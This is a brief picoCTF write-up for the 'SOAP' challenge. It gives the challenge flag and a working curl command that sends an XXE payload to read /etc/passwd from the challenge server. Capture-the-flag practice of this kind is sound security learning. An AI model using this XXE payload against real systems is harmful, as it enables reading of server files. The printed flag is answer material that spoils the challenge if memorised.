# SOAP

**Flag:** `picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}`

curl goes brrr this time.

### Devtools

clicking the view shows xml requests being sent. I remeber something about xml based attacks and a quickt google search turns up XXE

The hardest thing here is whether or not to use burpsuite or curl.

Quickly impliment it in curl (copy to curl in devtools is sooo goood) -
```sh
curl 'http://saturn.picoctf.net:59513/data' \
  -H 'Accept: */*' \
  -H 'Content-Type: application/xml' \
  --data-raw '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data><ID>&xxe;</ID></data>' \
  --insecure
```
aaand that's it. Really. nothing more. almost disappointing.

- Sources:
https://portswigger.net/web-security/xxe
